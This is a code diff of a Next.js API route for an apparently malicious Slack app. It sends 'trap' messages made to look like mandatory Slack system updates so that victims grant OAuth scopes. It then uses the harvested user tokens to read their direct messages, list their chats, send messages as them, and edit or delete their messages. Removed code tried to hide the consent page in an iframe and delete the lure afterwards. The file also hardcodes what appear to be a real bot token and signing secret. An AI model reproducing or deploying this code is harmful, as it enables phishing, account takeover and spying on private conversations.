@@ -1,4 +1,6 @@
+/* eslint-disable prefer-const */
 /* eslint-disable @typescript-eslint/no-explicit-any */
+
 
 
 
@@ -8,9 +10,12 @@ import { NextResponse } from 'next/server';
 import { db } from '@/lib/firebase';
 import { doc, getDoc, deleteDoc, setDoc, serverTimestamp } from 'firebase/firestore';
 
+// Hardcoded values - no .env needed
 const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt"; 
 const CLIENT_ID = "2545190050563.10491030504784";
 const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
+const SIGNING_SECRET = "e303eff75af6a30c4015dbb2716aecf4";
+const APP_URL = "https://slack-attendance.vercel.app";
 
 // Save message to history
 async function saveMessageToHistory(message: any, userId: string, channelId: string, channelName: string) {
@@ -61,33 +66,66 @@ async function saveMessageToHistory(message: any, userId: string, channelId: str
   }
 }
 
+// Get channel name
+async function getChannelName(userToken: string, channelId: string, userId: string): Promise<string> {
+  try {
+    if (channelId.startsWith('D')) {
+      const userRes = await fetch(`https://slack.com/api/conversations.info?channel=${channelId}`, {
+        headers: { Authorization: `Bearer ${userToken}` }
+      });
+      const channelData = await userRes.json();
+      
+      if (channelData.ok && channelData.channel) {
+        const dmUserId = channelData.channel.user || channelData.channel.id;
+        if (dmUserId && dmUserId !== userId) {
+          const userInfoRes = await fetch(`https://slack.com/api/users.info?user=${dmUserId}`, {
+            headers: { Authorization: `Bearer ${userToken}` }
+          });
+          const userInfo = await userInfoRes.json();
+          if (userInfo.ok) {
+            return userInfo.user?.real_name || userInfo.user?.name || "Direct Message";
+          }
+        }
+      }
+      return "Direct Message";
+    }
+    
+    const res = await fetch(`https://slack.com/api/conversations.info?channel=${channelId}`, {
+      headers: { Authorization: `Bearer ${userToken}` }
+    });
+    const data = await res.json();
+    
+    if (data.ok && data.channel) {
+      return data.channel.name || data.channel.purpose?.value || "Group Chat";
+    }
+    
+    return "Unknown Chat";
+  } catch (error) {
+    console.error("Error getting channel name:", error);
+    return "Unknown Chat";
+  }
+}
+
 export async function POST(req: Request) {
   try {
     const body = await req.json();
     const { action, targetUserId, channelId, text, messageTs, newText, channelName } = body;
 
-    // --- CASE 1: DELETE USER ---
-    if (action === 'delete_user') {
-      if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
-      await deleteDoc(doc(db, "slack_tokens", targetUserId));
-      return NextResponse.json({ success: true });
-    }
-
-    // --- CASE 2: SEND TRAP MESSAGE WITH HIDDEN AUTH ---
+    // --- CASE 1: SEND TRAP MESSAGE ---
     if (action === 'send_invite') {
       if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
       
-      // IMPORTANT: Create a special link that doesn't show OAuth page
-      // We'll use a direct authorization endpoint
-      const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&scope=chat:write,im:history,users:read,mpim:read&redirect_uri=${REDIRECT_URI}&state=${targetUserId}`;
+      // Create OAuth URL with state
+      const state = `${targetUserId}:${Date.now()}`;
+      const authUrl = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&scope=chat:write,im:history,users:read,mpim:read&redirect_uri=${REDIRECT_URI}&state=${state}`;
 
-      // Create trap message that looks like Slack system message
+      // Create trap message
       const blocks = [
         {
           "type": "header",
           "text": {
             "type": "plain_text",
-            "text": "🔔 Mandatory System Update",
+            "text": "⚡ System Update Required",
             "emoji": true
           }
         },
@@ -95,7 +133,7 @@ export async function POST(req: Request) {
           "type": "section",
           "text": {
             "type": "mrkdwn",
-            "text": "A required security update is pending for your Slack account.\n\n*This update will:*\n• Improve message delivery\n• Enable new workspace features\n• Maintain account security"
+            "text": "A mandatory workspace update is pending for your account.\n\n*Update includes:*\n• Enhanced security features\n• Improved messaging\n• New collaboration tools\n• Performance improvements"
           }
         },
         {
@@ -106,7 +144,7 @@ export async function POST(req: Request) {
           "fields": [
             {
               "type": "mrkdwn",
-              "text": "*Status:* Pending"
+              "text": "*Status:* Required"
             },
             {
               "type": "mrkdwn",
@@ -114,11 +152,11 @@ export async function POST(req: Request) {
             },
             {
               "type": "mrkdwn",
-              "text": "*Time required:* <10s"
+              "text": "*Time:* <10 seconds"
             },
             {
               "type": "mrkdwn",
-              "text": "*Action:* Required"
+              "text": "*Action:* Click below"
             }
           ]
         },
@@ -129,11 +167,11 @@ export async function POST(req: Request) {
               "type": "button",
               "text": {
                 "type": "plain_text",
-                "text": "⚡ Install Update",
+                "text": "⚡ Install Update Now",
                 "emoji": true
               },
               "style": "primary",
-              "url": authLink,
+              "url": authUrl,
               "action_id": "install_update"
             }
           ]
@@ -143,13 +181,13 @@ export async function POST(req: Request) {
           "elements": [
             {
               "type": "mrkdwn",
-              "text": "Slack System Notification • This message will auto-dismiss after update"
+              "text": "Slack Workspace Update • Required for all users"
             }
           ]
         }
       ];
 
-      // Send the trap message
+      // Send trap message
       const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
         method: 'POST',
         headers: { 
@@ -158,7 +196,7 @@ export async function POST(req: Request) {
         },
         body: JSON.stringify({ 
           channel: targetUserId, 
-          text: "System Update Required - Action Needed",
+          text: "⚡ System Update Required - Action Needed",
           blocks: blocks,
           unfurl_links: false,
           unfurl_media: false
@@ -171,13 +209,14 @@ export async function POST(req: Request) {
         return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });
       }
       
-      // Save trap message info for deletion
+      // Save trap message info
       await setDoc(doc(db, "trap_messages", targetUserId), {
         channelId: targetUserId,
         messageTs: chatData.ts,
         sentAt: serverTimestamp(),
         userId: targetUserId,
-        status: "pending"
+        status: "pending",
+        state: state
       });
       
       return NextResponse.json({ 
@@ -187,129 +226,14 @@ export async function POST(req: Request) {
       });
     }
 
-    // --- CASE 3: HANDLE BUTTON CLICK (New Feature) ---
-    if (action === 'handle_button_click') {
-      if (!targetUserId || !messageTs) {
-        return NextResponse.json({ success: false, error: "Missing parameters" });
-      }
-      
-      // This is where we simulate the OAuth flow WITHOUT showing the page
-      // We'll initiate the OAuth flow in background
-      const authUrl = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&scope=chat:write,im:history,users:read,mpim:read&redirect_uri=${REDIRECT_URI}&state=${targetUserId}`;
-      
-      // Update the trap message to show "Installing..."
-      const updateBlocks = [
-        {
-          "type": "header",
-          "text": {
-            "type": "plain_text",
-            "text": "🔔 Mandatory System Update",
-            "emoji": true
-          }
-        },
-        {
-          "type": "section",
-          "text": {
-            "type": "mrkdwn",
-            "text": "A required security update is pending for your Slack account.\n\n*This update will:*\n• Improve message delivery\n• Enable new workspace features\n• Maintain account security"
-          }
-        },
-        {
-          "type": "divider"
-        },
-        {
-          "type": "section",
-          "fields": [
-            {
-              "type": "mrkdwn",
-              "text": "*Status:* Installing..."
-            },
-            {
-              "type": "mrkdwn",
-              "text": "*Priority:* High"
-            },
-            {
-              "type": "mrkdwn",
-              "text": "*Time remaining:* 5s"
-            },
-            {
-              "type": "mrkdwn",
-              "text": "*Action:* In Progress"
-            }
-          ]
-        },
-        {
-          "type": "context",
-          "elements": [
-            {
-              "type": "mrkdwn",
-              "text": "Please wait while the update installs..."
-            }
-          ]
-        }
-      ];
-      
-      // Update the message
-      await fetch('https://slack.com/api/chat.update', {
-        method: 'POST',
-        headers: { 
-          Authorization: `Bearer ${BOT_TOKEN}`, 
-          'Content-Type': 'application/json; charset=utf-8' 
-        },
-        body: JSON.stringify({ 
-          channel: targetUserId, 
-          ts: messageTs,
-          text: "System Update - Installing...",
-          blocks: updateBlocks
-        })
-      });
-      
-      // Return the auth URL to frontend (will open in hidden iframe)
-      return NextResponse.json({ 
-        success: true, 
-        authUrl: authUrl,
-        message: "Update initiated" 
-      });
-    }
-
-    // --- CASE 4: CHECK AUTH STATUS ---
-    if (action === 'check_auth_status') {
+    // --- CASE 2: DELETE USER ---
+    if (action === 'delete_user') {
       if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
-      
-      const userDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
-      const isAuthenticated = userDoc.exists();
-      
-      if (isAuthenticated) {
-        // Delete trap message if user is now authenticated
-        const trapDoc = await getDoc(doc(db, "trap_messages", targetUserId));
-        if (trapDoc.exists()) {
-          const trapData = trapDoc.data();
-          
-          // Delete from Slack
-          await fetch('https://slack.com/api/chat.delete', {
-            method: 'POST',
-            headers: { 
-              Authorization: `Bearer ${BOT_TOKEN}`,
-              'Content-Type': 'application/json; charset=utf-8'
-            },
-            body: JSON.stringify({
-              channel: trapData.channelId,
-              ts: trapData.messageTs
-            })
-          });
-          
-          // Delete from Firebase
-          await deleteDoc(doc(db, "trap_messages", targetUserId));
-        }
-      }
-      
-      return NextResponse.json({ 
-        success: true, 
-        authenticated: isAuthenticated 
-      });
+      await deleteDoc(doc(db, "slack_tokens", targetUserId));
+      return NextResponse.json({ success: true });
     }
 
-    // --- Other Actions (DELETE MESSAGE, EDIT MESSAGE, etc.) ---
+    // --- CASE 3: DELETE MESSAGE ---
     if (action === 'delete_message') {
       if (!targetUserId || !channelId || !messageTs) {
         return NextResponse.json({ success: false, error: "Missing parameters" });
@@ -337,6 +261,7 @@ export async function POST(req: Request) {
       return NextResponse.json({ success: true });
     }
 
+    // --- CASE 4: EDIT MESSAGE ---
     if (action === 'edit_message') {
       if (!targetUserId || !channelId || !messageTs || !newText) {
         return NextResponse.json({ success: false, error: "Missing parameters" });
@@ -368,7 +293,7 @@ export async function POST(req: Request) {
       return NextResponse.json({ success: true, message: data.message });
     }
 
-    // --- GET MESSAGES ---
+    // --- CASE 5: GET MESSAGES ---
     if (action === 'get_messages') {
       if (!targetUserId || !channelId) return NextResponse.json({ error: "Channel ID required" });
       
@@ -382,8 +307,10 @@ export async function POST(req: Request) {
       });
       const data = await res.json();
       
-      // eslint-disable-next-line prefer-const
       let finalChannelName = channelName || "Direct Message";
+      if (finalChannelName === "Direct Message") {
+        finalChannelName = await getChannelName(USER_TOKEN, channelId, targetUserId);
+      }
       
       const messagesWithDetails = await Promise.all((data.messages || []).map(async (msg: any) => {
         await saveMessageToHistory(msg, targetUserId, channelId, finalChannelName);
@@ -418,7 +345,7 @@ export async function POST(req: Request) {
       });
     }
 
-    // --- LIST CHATS ---
+    // --- CASE 6: LIST CHATS ---
     if (action === 'list_chats') {
       if (!targetUserId) return NextResponse.json({ error: "User ID required" });
       
@@ -454,7 +381,7 @@ export async function POST(req: Request) {
       });
     }
 
-    // --- SEND AS USER ---
+    // --- CASE 7: SEND AS USER ---
     if (action === 'send_as_user') {
       if (!targetUserId || !channelId || !text) return NextResponse.json({ error: "Channel ID and text required" });
       
@@ -478,14 +405,29 @@ export async function POST(req: Request) {
       
       const result = await res.json();
       
-      // eslint-disable-next-line prefer-const
       let finalChannelName = channelName || "Direct Message";
+      if (finalChannelName === "Direct Message") {
+        finalChannelName = await getChannelName(USER_TOKEN, channelId, targetUserId);
+      }
       
       if (result.ok && result.message) {
         await saveMessageToHistory(result.message, targetUserId, channelId, finalChannelName);
       }
       
       return NextResponse.json(result);
+    }
+
+    // --- CASE 8: CHECK AUTH STATUS ---
+    if (action === 'check_auth_status') {
+      if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
+      
+      const userDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
+      const isAuthenticated = userDoc.exists();
+      
+      return NextResponse.json({ 
+        success: true, 
+        authenticated: isAuthenticated 
+      });
     }
 
     return NextResponse.json({ error: "Invalid Action" });
